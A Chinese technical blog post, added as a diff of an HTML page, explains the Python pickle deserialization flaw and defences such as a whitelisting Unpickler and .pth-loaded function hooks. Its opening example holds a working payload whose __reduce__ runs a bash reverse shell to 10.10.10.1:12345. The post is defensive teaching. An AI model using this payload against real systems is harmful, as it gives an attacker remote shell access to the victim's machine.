@@ -1,0 +1,560 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" /> 
+    <title>飞哥讲代码24：从Python Pickle漏洞说起 - 蘭陵N梓記</title>
+    <meta name="keywords" content="蘭陵N梓記,兰陵,独立,博客,程序员,架构师,个人,思考,读书,笔记,技术,分享,Java,Golang">
+    
+    <meta property="og:title" content="飞哥讲代码24：从Python Pickle漏洞说起">
+    <meta property="og:site_name" content="蘭陵N梓記">
+    <meta property="og:image" content="/img/author.jpg"> 
+    <meta name="title" content="飞哥讲代码24：从Python Pickle漏洞说起 - 蘭陵N梓記" />
+    <meta name="description" content="蘭陵N梓記 | 博客 | 软件 | 架构 | Java | Golang"> 
+    <link rel="shortcut icon" href="http://lanlingzi.cn/img/favicon.ico" />
+    <link rel="apple-touch-icon" href="http://lanlingzi.cn/img/apple-touch-icon.png" />
+    <link rel="apple-touch-icon-precomposed" href="http://lanlingzi.cn/img/apple-touch-icon.png" />
+    <link href="http://lanlingzi.cn/js/vendor/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+    <link href="http://lanlingzi.cn/js/vendor/fancybox/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+    <link href="http://lanlingzi.cn/css/main.css" rel="stylesheet" type="text/css" />
+    <link href="http://lanlingzi.cn/css/syntax.css" rel="stylesheet" type="text/css" />
+    <script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"post"},
+     fancybox: true, 
+    motion: true
+  };
+</script>
+</head>
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+<div class="container one-collumn sidebar-position-left page-home  ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"> <div class="site-meta  custom-logo ">
+
+  <div class="custom-logo-site-title">
+    <a href="http://lanlingzi.cn/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">蘭陵N梓記</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">一指流沙，程序年华</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+      
+      
+        <li class="menu-item ">
+          <a href="http://lanlingzi.cn/" rel="section">
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页
+          </a>
+        </li>
+      
+        <li class="menu-item ">
+          <a href="http://lanlingzi.cn/post/" rel="section">
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档
+          </a>
+        </li>
+      
+        <li class="menu-item ">
+          <a href="http://lanlingzi.cn/about/" rel="section">
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />关于
+          </a>
+        </li>
+      
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger"> <i class="menu-item-icon fa fa-search fa-fw"></i> <br /> 搜索</a>
+      </li>
+    </ul>
+    <div class="site-search">
+      <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+    </div>
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+<section id="posts" class="posts-expand">
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+      <h1 class="post-title" itemprop="name headline">
+        <a class="post-title-link" href="http://lanlingzi.cn/post/technical/2021/0313_code/" itemprop="url">
+        飞哥讲代码24：从Python Pickle漏洞说起
+        </a>
+      </h1>
+      <div class="post-meta">
+      <span class="post-time">
+<span class="post-meta-item-icon">
+    <i class="fa fa-calendar-o"></i>
+</span>
+<span class="post-meta-item-text">时间：</span>
+<time itemprop="dateCreated" datetime="2016-03-22T13:04:35+08:00" content="2021-03-13">
+    2021-03-13
+</time>
+</span> 
+      
+
+  <span class="post-category" >
+  &nbsp; | &nbsp;
+  <span class="post-meta-item-icon">
+    <i class="fa fa-folder-o"></i>
+  </span>
+  <span class="post-meta-item-text">分类：</span>
+  
+    <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+      <a href="http://lanlingzi.cn/categories/%E6%8A%80%E6%9C%AF" itemprop="url" rel="index">
+        <span itemprop="name">技术</span>
+      </a>
+      &nbsp; 
+    </span>
+  
+</span>
+
+
+       <span>
+&nbsp; | &nbsp;
+<span class="post-meta-item-icon">
+    <i class="fa fa-eye"></i>
+</span>
+<span class="post-meta-item-text">阅读：</span>
+<span class="leancloud-visitors-count">3831 字 ~8分钟</span>
+</span>
+      </div>
+    </header>
+    <div class="post-body" itemprop="articleBody">
+    <blockquote>
+<p>《泾溪》&ndash; 杜荀鹤<br>
+泾溪石险人兢慎，终岁不闻倾覆人。<br>
+却是平流无石处，时时闻说有沉论。</p>
+</blockquote>
+<h1 id="案例">案例</h1>
+<p>有次同事找我看个Python的安全问题。测试代码是这样的：</p>
+<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#8b008b;font-weight:bold">import</span> <span style="color:#008b45;text-decoration:underline">pickle</span>
+<span style="color:#8b008b;font-weight:bold">import</span> <span style="color:#008b45;text-decoration:underline">os</span>
+
+<span style="color:#8b008b;font-weight:bold">class</span> <span style="color:#008b45;font-weight:bold">Test</span>(<span style="color:#658b00">object</span>):
+    <span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">__reduce__</span>(self):
+        cmd = <span style="color:#cd5555">&#34;&#34;&#34;bash -i &amp;&gt; /dev/tcp/10.10.10.1/12345 0&gt;&amp;1 2&gt;&amp;1&#34;&#34;&#34;</span>
+        <span style="color:#8b008b;font-weight:bold">return</span> (os.system,(cmd,))
+
+<span style="color:#8b008b;font-weight:bold">if</span> __name__ == <span style="color:#cd5555">&#34;__main__&#34;</span>:
+    test = Test()
+    bs = pickle.dumps(test)
+    pickle.loads(bs)
+</code></pre></div><p>这个是利用pickle反序列化漏洞，结合shell反弹的安全入侵。当代码执行之后，会后台与10.10.10.1:12345建立连接，在10.10.10.1上的用户则可以直接像ssh远程一样操作你的机器。</p>
+<p>目前Python在AI领域应用越来越多，不少传统机器学习的模型也采用pickle格式保存。如基于sklearn训练的模型，通常采用pickle.dump把模型生成pkl文件，当再使用模型时，则通过pickle.load加载模型来进行推理预测。像Java中json/xml/yaml的序列化与反序列化一样，python的pickle对象序列化与反序列化存在更为严重的安全风险。</p>
+<h1 id="漏洞分析">漏洞分析</h1>
+<p>pickle在<a href="https://docs.python.org/3/library/pickle.html">python的官方介绍</a>中有一段这样的介绍:</p>
+<blockquote>
+<p><strong>Warning</strong> The pickle module <strong>is not secure</strong>. Only unpickle data you trust.</p>
+<p>It is possible to construct malicious pickle data which will <strong>execute arbitrary code during unpickling</strong>. Never unpickle data that could have come from an untrusted source, or that could have been tampered with.</p>
+<p>Consider signing data with hmac if you need to ensure that it has not been tampered with.</p>
+</blockquote>
+<p>简单翻译一下：只对你信任数据进行unpickle，因为可以构建恶意的pickle数据，在unpickle时会执行任何代码，要么考虑采用hmac对数据签名检查。</p>
+<p>pickle是一种基于栈的编程语言，目前发展到python3.8已有5个版本协议。我们使用python2先看一下案例中的代码序列化会生成什么（python3中dumps类型是bytes而在python2是str）:</p>
+<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">cposix
+system
+p0
+(S<span style="color:#cd5555">&#39;bash -i &amp;&gt; /dev/tcp/10.10.10.1/12345 0&gt;&amp;1 2&gt;&amp;1&#39;</span>
+p1
+tp2
+Rp3
+.
+</code></pre></div><p>这是pickle语言指令，能执行这种指令是PVM(Pickle Virtul Machine)，Python运行环境也是一个PVM，它由下面三部分组成：</p>
+<ul>
+<li>指令处理器(Instruction processor)：解释与执行指令，遇到<code>.</code>结束</li>
+<li>栈区(stack)：数据处理过程中的暂存区，通过进出栈完成数据操作</li>
+<li>标签区(memo)：数据索引或者标记，全生命周期存储数据，以Key/Value存储数据</li>
+</ul>
+<p>结合上面生成的内容来看，它有如下指令：</p>
+<ul>
+<li><code>c</code>：读取本行的内容作为模块名module, 读取下一行的内容作为对象名object，然后将module.object作为可调用对象压入到栈中。注：os模块在linux下其实是posix</li>
+<li><code>(</code>：标记对象压入到栈中, 常搭配<code>t</code>指令一起使用, 以便产生一个元组</li>
+<li><code>t</code>：从堆栈中弹出对象，创建一个包含弹出对象除了<code>(</code>的元组对象</li>
+<li><code>S</code>：后面跟字符串，遇到换行将内容压入到栈中</li>
+<li><code>R</code>：将之前压入栈中的元组和可调用对象全部弹出，将该元组作为可调用参数的对象并执行该对象，并把执行结果压入到栈中</li>
+<li><code>.</code>：结束整个pickle反序列化过程</li>
+<li><code>p1~p3</code>：将栈顶数据存入memo中，后面的数字是编号</li>
+</ul>
+<p>当然pickle还有其它的指令，这里就不再一一列出了，更多的指令可以查看pickle的源码<a href="https://github.com/python/cpython/blob/master/Lib/pickle.py#L111">pickle.py</a>。</p>
+<p>pickle反序列化漏洞出在<a href="https://docs.python.org/3/library/pickle.html#object.__reduce__"><code>__reduce__</code></a>函数上，当采用C语言定义Python扩展类型时，若想pickle此类型，则需要告诉python如何pickle它们。一旦
+<code>__reduce__</code>函数定义，pickle序列化时会被调用，它要么返回一个代表全局名称的字符串，要么返回一个元组。这个元组包含2到6个元素，其中包括：</p>
+<ul>
+<li>一个可调用的对象，用于重建对象时调用</li>
+<li>一个参数元素，供那个可调用对象使用</li>
+<li>被传递给 <code>__setstate__</code> 的状态， 可选</li>
+<li>一个产生被pickle的列表元素的迭代器，可选</li>
+<li>一个产生被pickle的字典元素的迭代器，可选</li>
+<li>一个可以调用的callable，参数为(obj, state)，可选，3.8才新增的</li>
+</ul>
+<p>就是由于个这个元组，跟pickle中的指令<code>R</code>可被利用之机：&ldquo;该元组作为可调用参数的对象并执行该对象&rdquo;，如果这个元组有恶意代码，则可以调用而产生风险。虽然<code>__reduce__</code>返回只能是一个可调用对象，但可以结合os.system，subprocess.run，exec来执行任一命令或代码，几乎能做任何事了。</p>
+<h1 id="解决办法">解决办法</h1>
+<p>正如python官方对pickle的介绍说明，只对信任的数据unpickle，对数据数字签名检查。但通常数字签名只限于自产自销的场景。打开pickle的源码来看，事实上还有另一个方法。python定义了Unpickler的接口，关键在于可以覆写find_class，下面是标准库的默认实现：</p>
+<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    <span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">find_class</span>(self, module, name):
+        <span style="color:#228b22"># Subclasses may override this.</span>
+        sys.audit(<span style="color:#cd5555">&#39;pickle.find_class&#39;</span>, module, name)
+        <span style="color:#8b008b;font-weight:bold">if</span> self.proto &lt; <span style="color:#b452cd">3</span> <span style="color:#8b008b">and</span> self.fix_imports:
+            <span style="color:#8b008b;font-weight:bold">if</span> (module, name) <span style="color:#8b008b">in</span> _compat_pickle.NAME_MAPPING:
+                module, name = _compat_pickle.NAME_MAPPING[(module, name)]
+            <span style="color:#8b008b;font-weight:bold">elif</span> module <span style="color:#8b008b">in</span> _compat_pickle.IMPORT_MAPPING:
+                module = _compat_pickle.IMPORT_MAPPING[module]
+        <span style="color:#658b00">__import__</span>(module, level=<span style="color:#b452cd">0</span>)
+        <span style="color:#8b008b;font-weight:bold">if</span> self.proto &gt;= <span style="color:#b452cd">4</span>:
+            <span style="color:#8b008b;font-weight:bold">return</span> _getattribute(sys.modules[module], name)[<span style="color:#b452cd">0</span>]
+        <span style="color:#8b008b;font-weight:bold">else</span>:
+            <span style="color:#8b008b;font-weight:bold">return</span> <span style="color:#658b00">getattr</span>(sys.modules[module], name)
+</code></pre></div><p>默认实现的find_class函数会自动导入模块，并且还兼容python2时fix_imports。若覆写，采用对导入模块做白名单检查控制，不允许导入像os.system等可以执行命令或代码能力，则问题已基本可以解决。那这个函数什么时机被调用呢？从代码搜索来看有4处调用此函数，他们是在解释指令的地方。如案例中的<code>c</code>指令导入模块时，就会调用它。</p>
+<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#8b008b;font-weight:bold">import</span> <span style="color:#008b45;text-decoration:underline">pickle</span>
+
+<span style="color:#8b008b;font-weight:bold">class</span> <span style="color:#008b45;font-weight:bold">WhiteListUnpickler</span>(pickle.Unpickler):
+    <span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">find_class</span>(self, module, name):
+        self.check_safe_module(module, name)
+        <span style="color:#8b008b;font-weight:bold">return</span> <span style="color:#658b00">super</span>().find_class(module, name)
+    
+    <span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">check_safe_module</span>(module, name):
+        <span style="color:#228b22"># 检查是否在白名单</span>
+        <span style="color:#8b008b;font-weight:bold">if</span> module != <span style="color:#cd5555">&#39;__main__&#39;</span>: 
+            <span style="color:#8b008b;font-weight:bold">raise</span> pickle.UnpicklingError(<span style="color:#cd5555">&#34;&#39;</span><span style="color:#cd5555">%s</span><span style="color:#cd5555">.</span><span style="color:#cd5555">%s</span><span style="color:#cd5555">&#39; is forbidden&#34;</span> % (module, name))
+
+bs = <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;....&#39;</span> <span style="color:#228b22"># 需要unpickler的内容</span>
+<span style="color:#658b00">file</span> = io.BytesIO(bs)
+WhiteListUnpickler(<span style="color:#658b00">file</span>).load()
+</code></pre></div><p>上面的代码示例只允许<code>__main__</code>模块调用，采用白名单谨慎列出安全的模块则可以规避安全问题。但这需要调用者生成WhiteListUnpickler类，对业务代码有侵入性。那有没有一种对上层调用不感知的修改？有:</p>
+<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#8b008b;font-weight:bold">import</span> <span style="color:#008b45;text-decoration:underline">pickle</span>
+
+<span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">safe_load</span>(<span style="color:#658b00">file</span>, *, fix_imports=True, encoding=<span style="color:#cd5555">&#34;ASCII&#34;</span>, errors=<span style="color:#cd5555">&#34;strict&#34;</span>,
+          buffers=None):
+    <span style="color:#8b008b;font-weight:bold">return</span> WhiteListUnpickler(<span style="color:#658b00">file</span>, fix_imports=fix_imports, buffers=buffers,
+                     encoding=encoding, errors=errors).load()
+
+<span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">safe_loads</span>(s, *, fix_imports=True, encoding=<span style="color:#cd5555">&#34;ASCII&#34;</span>, errors=<span style="color:#cd5555">&#34;strict&#34;</span>,
+           buffers=None):
+    <span style="color:#658b00">file</span> = io.BytesIO(s)
+    <span style="color:#8b008b;font-weight:bold">return</span> WhiteListUnpickler(<span style="color:#658b00">file</span>, fix_imports=fix_imports, buffers=buffers,
+                      encoding=encoding, errors=errors).load()
+
+pickle.load = safe_load
+pickle.loads = safe_loads
+
+<span style="color:#228b22"># 后面的代码调用pickle.loads时，真实调用的safe_loads</span>
+</code></pre></div><p>python是动态语言，任何模块、对象、函数都是可能动态替换的，不光如此，还可以动态给类/实例增加方法或成员变量。</p>
+<h1 id="自动加载">自动加载</h1>
+<p>前面通过safe_loads替换了标准库的实现，但我们还需要解决一个问题，如何让替换的代码先于业务代码执行？不好的做法是所有替换逻辑封装一个API，让业务在启动时最开始的地方调用一下。那有没有一种对上层不感知的自动加载？有。</p>
+<p>对于C程序，通过设置LD_PRELOAD环境变量可以先加载一个动态库，替换系统函数或者进程中其它导出符号的函数。Python是否也有一种机制？Python的玩法有些不一样，提供了另一种机制。参见官方文档<a href="https://docs.python.org/zh-cn/3/library/site.html">site —— 指定域的配置钩子</a>。对机制简述如下：</p>
+<ul>
+<li>标准库有一个site.py文件，它会在python启动时先于业务脚本执行</li>
+<li>site.py会扫描site-packages目录下所有.pth扩展名的文件</li>
+<li>执行这些文件中代码(写法有要求)，并把它返回的path加入到sys.path中，以便能import</li>
+</ul>
+<p>这就相当留下一个钩子，可以完成第三方模块导入时的初始化。利用这个机制，同样可以完成需要替换的函数先于业务代码自动加载。site机制如此的强大，其实也是一个非常大的安全隐患。因为我们通过pip install来安装第三方库，也可能写入pth文件，若它是一个恶意库或被篡改了，鬼知道它会做什么呢。前一段时间刷新闻看到pypi仓库清理了5000多个有问题的库。</p>
+<p>假定我们需要替换多个标准库的函数实现，若一个个通过<code>pickle.loads = safe_loads</code>这类方式来替换看起来有点比较丑陋，有没有一种可以比较好玩的方法？有：</p>
+<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#8b008b;font-weight:bold">class</span> <span style="color:#008b45;font-weight:bold">Hook</span>:
+    <span style="color:#8b008b;font-weight:bold">def</span> __init__(self):
+        self._hook_to_orig = <span style="color:#658b00">dict</span>()
+        self._orig_to_hook = <span style="color:#658b00">dict</span>()
+
+    <span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">register</span>(self, obj, attr):
+        <span style="color:#cd5555">&#34;&#34;&#34;注册hook函数&#34;&#34;&#34;</span>
+        full_name = <span style="color:#cd5555">&#39;.&#39;</span>.join([obj.__name__, attr])
+        <span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">wrapper</span>(new_attr):
+            self._orig_to_hook[full_name] = new_attr
+            old_attr = <span style="color:#658b00">getattr</span>(obj, attr)
+            <span style="color:#658b00">setattr</span>(obj, attr, new_attr)
+            self._hook_to_orig[new_attr.__name__] = old_attr
+            <span style="color:#8b008b;font-weight:bold">return</span> new_attr
+        <span style="color:#8b008b;font-weight:bold">return</span> wrapper
+
+    <span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">get_orig_func</span>(self):
+        <span style="color:#cd5555">&#34;&#34;&#34;获取原始函数&#34;&#34;&#34;</span>
+        frame = sys._getframe(<span style="color:#b452cd">1</span>)
+        <span style="color:#8b008b;font-weight:bold">if</span> frame <span style="color:#8b008b">and</span> frame.f_code.co_name <span style="color:#8b008b">in</span> self._hook_to_orig:
+            <span style="color:#8b008b;font-weight:bold">return</span> self._hook_to_orig[frame.f_code.co_name]
+        <span style="color:#8b008b;font-weight:bold">else</span>:
+            <span style="color:#8b008b;font-weight:bold">raise</span> <span style="color:#008b45;font-weight:bold">Exception</span>(<span style="color:#cd5555">&#34;`original` must be called from a hooked function&#34;</span>)
+
+hook = Hook()
+
+<span style="color:#228b22"># 示例，对os.system进行hook</span>
+<span style="color:#707a7c">@hook.register</span>(os, <span style="color:#cd5555">&#39;system&#39;</span>)
+<span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">hook_system</span>(cmd):
+    <span style="color:#8b008b;font-weight:bold">raise</span> <span style="color:#008b45;font-weight:bold">Exception</span>(<span style="color:#cd5555">&#34;forbid execute the function&#34;</span>)
+
+<span style="color:#228b22"># 示例，对open进行hook</span>
+<span style="color:#707a7c">@hook.register</span>(buildins, <span style="color:#cd5555">&#39;open&#39;</span>)
+<span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">hook_open</span>(*arg, **argv):
+    orig = get_orig_func()
+    <span style="color:#228b22"># 对参数检查，如检查文件路径是否合法 </span>
+    <span style="color:#8b008b;font-weight:bold">return</span> orig(*arg, **argv)
+</code></pre></div><p>代码不算很难，Hook类主要提供两个函数（注：代码只做演示，未考虑一些异常场景）：</p>
+<ul>
+<li>register：装饰器函数，用于注册hook的函数，保存与原始函数映射关系</li>
+<li>get_orig_func：用于获取原始函数</li>
+</ul>
+<p>假定把上面的代码放在一个叫hook.py文件中，创建一个hook.pth放在site-packages目录下，它通过runpy.run_module执行hook.py，则可以完成了各种hook，前面的pickle的扩展也可以采用此方法，完成自动加载，并且可以进步在find_class修改，查找已被替换的安全函数，而不是原始函数。</p>
+<p>当然上面的演示只是让替换现有函数看起来美观一些，若应用层代码能拿到hook对象，还是可以找回来原始函数，这就是可以绕开了安全检查（逃逸）。若避免逃逸还需要禁止各种可能的绕过：比如禁止导入hook模块，禁上执行hook代码，禁止执行被hook函数的源码等等。</p>
+<p>再扩展一下，基于上述的机制，我们可以实现一套安全库，用于尽可能减少代码出现潜在的安全风险，把已知经验沉淀下来：比如路径检查，执行命令检查，端口检查，反序列化检查，代码执行检查，xml实体攻击检查，高风险函数禁用等等。我们搞安全，不仅仅是要做CheckList，更加要沉淀代码复用。</p>
+<h1 id="结语">结语</h1>
+<p>代码安全问题随处可见，犯错的成本很低。道路千万条，安全第一条，通过框架/CBB来减少代码层面的安全风险是一条比较好的路。正好本文开头的诗句所讲的，兢慎减少风险，平流容易大意。做为一名程序员，无论如何，我们要先记住不信任任何外部输入，树立安全风险意识。</p>
+    </div>
+    <footer class="post-footer">
+     
+ 
+<div class="post-tags">     
+     
+    <a href="http://lanlingzi.cn/tags/%e8%bd%af%e4%bb%b6%e5%bc%80%e5%8f%91" rel="tag" title="软件开发">#软件开发#</a>
+    
+    <a href="http://lanlingzi.cn/tags/python" rel="tag" title="python">#python#</a>
+    
+</div>
+
+
+
+     <div class="post-nav">
+    <div class="post-nav-next post-nav-item">
+    
+    </div>
+
+    <div class="post-nav-prev post-nav-item">
+    
+        <a href="http://lanlingzi.cn/post/technical/2021/0307_code/" rel="prev" title="飞哥讲代码23：C/C&#43;&#43;内存空洞">
+        飞哥讲代码23：C/C&#43;&#43;内存空洞 <i class="fa fa-chevron-right"></i>
+        </a>
+    
+    </div>
+</div>
+      
+     
+     
+     
+
+
+
+
+     <div class="post-nav">
+<div style="border: 1px dashed #e0e0e0; padding: 10px 10px 10px 10px; background-color: #fffeee; background-repeat: no-repeat; background-attachment: scroll; background-position: 1% 50%; -moz-background-size: auto auto; -moz-background-clip: -moz-initial; -moz-background-origin: -moz-initial; -moz-background-inline-policy: -moz-initial;">
+    <div style="float:left;margin-top:0px;">
+    <img src="http://lanlingzi.cn/images/qrcode/qrcode_8cm.jpg" width="129px" height="129px"/>
+    <div style="text-align:center;">微信扫一扫交流</div>
+    </div>
+    <div>
+        <p style="margin-top:0px;">
+            标题：飞哥讲代码24：从Python Pickle漏洞说起
+        <br />作者：<a target="_blank" href="http://lanlingzi.cn/">兰陵子</a>
+        <br />关注：lanlingthink（览聆时刻）
+        <br />声明：自由转载-非商用-非衍生-保持署名（创作共享3.0许可证）
+        </p>
+    </div>
+</div>
+<div class="clear"></div>
+</div>
+    </footer>
+  </article>
+</section>
+
+          </div>
+        </div>
+        <div class="sidebar-toggle">
+  <div class="sidebar-toggle-line-wrap">
+    <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+    <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+    <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+  </div>
+</div>
+<aside id="sidebar" class="sidebar">
+  <div class="sidebar-inner">
+
+  <ul class="sidebar-nav motion-element">
+    <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+      文章目录
+    </li>
+    <li class="sidebar-nav-overview" data-target="site-overview">
+      站点概览
+    </li>
+  </ul>
+
+    <section class="site-overview sidebar-panel ">
+      <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+        src="http://lanlingzi.cn/img/author.jpg"
+        alt="兰陵子" />
+    <p class="site-author-name" itemprop="name">兰陵子</p>
+    <p class="site-description motion-element" itemprop="description"> 
+        Programmer &amp; Architect</p>
+</div>
+      <nav class="site-state motion-element">
+    <div class="site-state-item site-state-posts">
+      <a href="http://lanlingzi.cn/post/">
+        <span class="site-state-item-count">148</span>
+        <span class="site-state-item-name">日志</span>
+      </a>
+    </div>
+    <div class="site-state-item site-state-categories">    
+        <a href="http://lanlingzi.cn/categories/">      
+         
+        <span class="site-state-item-count">4</span>
+        
+        <span class="site-state-item-name">分类</span>
+        
+        </a>
+    </div>
+
+    <div class="site-state-item site-state-tags">
+        <a href="http://lanlingzi.cn/tags/">
+         
+        <span class="site-state-item-count">57</span>
+        
+        <span class="site-state-item-name">标签</span>
+        </a>
+    </div>
+</nav>
+      
+      
+<div class="links-of-author motion-element">
+    
+        <span class="links-of-author-item">
+        <a href="https://github.com/xtfly/" target="_blank" title="GitHub">
+            <i class="fa fa-fw fa-github"></i>
+            GitHub
+        </a>
+        </span>
+    
+        <span class="links-of-author-item">
+        <a href="https://www.zhihu.com/people/lan-ling-xin-yun" target="_blank" title="知乎">
+            <i class="fa fa-fw fa-globe"></i>
+            知乎
+        </a>
+        </span>
+    
+</div>
+
+
+      
+
+      <div class="links-of-blogroll motion-element inline">
+<script type="text/javascript" src="//rf.revolvermaps.com/0/0/8.js?i=5b4f2ucxar6&amp;m=0&amp;s=220&amp;c=ff0000&amp;cr1=ffffff&amp;f=arial&amp;l=33&amp;bv=35" async="async"></script>
+</div>
+
+    </section>
+    
+<section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+    <div class="post-toc">
+        <div class="post-toc-content"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#案例">案例</a></li>
+    <li><a href="#漏洞分析">漏洞分析</a></li>
+    <li><a href="#解决办法">解决办法</a></li>
+    <li><a href="#自动加载">自动加载</a></li>
+    <li><a href="#结语">结语</a></li>
+  </ul>
+</nav></div>
+    </div>
+</section>
+
+  </div>
+</aside>
+
+      </div>
+    </main>
+   
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  <span itemprop="copyrightYear">  &copy; 
+  2009 - 2021</span>
+  <span class="with-love"><i class="fa fa-heart"></i></span>
+  <span class="author" itemprop="copyrightHolder">蘭陵N梓記</span>
+</div>
+<div class="powered-by">
+  Powered by - <a class="theme-link" href="http://gohugo.io" target="_blank" title="hugo" >Hugo v0.81.0</a>
+</div>
+<div class="theme-info">
+  Theme by - <a class="theme-link" href="https://github.com/xtfly/hugo-theme-next" target="_blank"> NexT
+  </a>
+</div>
+
+
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+      <span id="scrollpercent"><span>0</span>%</span>
+    </div>
+  </div>
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+    var hm = document.createElement("script");
+    hm.src = "//hm.baidu.com/hm.js?0b07433b4ab8d587dae7d34e71973839";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+<script type="text/javascript" src="http://tajs.qq.com/stats?sId=58416275" charset="UTF-8"></script> 
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+<script type="text/javascript" src="http://lanlingzi.cn/js/vendor/jquery/index.js?v=2.1.3"></script>
+<script type="text/javascript" src="http://lanlingzi.cn/js/vendor/fastclick/lib/fastclick.min.js?v=1.0.6"></script> 
+<script type="text/javascript" src="http://lanlingzi.cn/js/vendor/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+<script type="text/javascript" src="http://lanlingzi.cn/js/vendor/velocity/velocity.min.js?v=1.2.1"></script>
+<script type="text/javascript" src="http://lanlingzi.cn/js/vendor/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="http://lanlingzi.cn/js/vendor/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+
+<script src="http://lanlingzi.cn/js/vendor/fancybox/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+<script type="text/javascript" src="http://lanlingzi.cn/js/utils.js"></script>
+<script type="text/javascript" src="http://lanlingzi.cn/js/motion.js"></script>
+<script type="text/javascript" src="http://lanlingzi.cn/js/affix.js"></script>
+<script type="text/javascript" src="http://lanlingzi.cn/js/schemes/pisces.js"></script>
+
+<script type="text/javascript" src="http://lanlingzi.cn/js/scrollspy.js"></script>
+<script type="text/javascript" src="http://lanlingzi.cn/js/post-details.js"></script>
+<script type="text/javascript" src="http://lanlingzi.cn/js/toc.js"></script>
+
+<script type="text/javascript" src="http://lanlingzi.cn/js/bootstrap.js"></script>
+
+<script type="text/javascript" src="http://lanlingzi.cn/js/search.js"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    extensions: ["tex2jax.js"],
+    jax: ["input/TeX", "output/HTML-CSS"],
+    tex2jax: {
+      inlineMath: [ ['$','$'] ],
+      displayMath: [ ['$$','$$'] ],
+      processEscapes: true
+    },
+    "HTML-CSS": { fonts: ["TeX"] }
+  });
+</script>
+<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML' async></script>
+</body>
+</html>
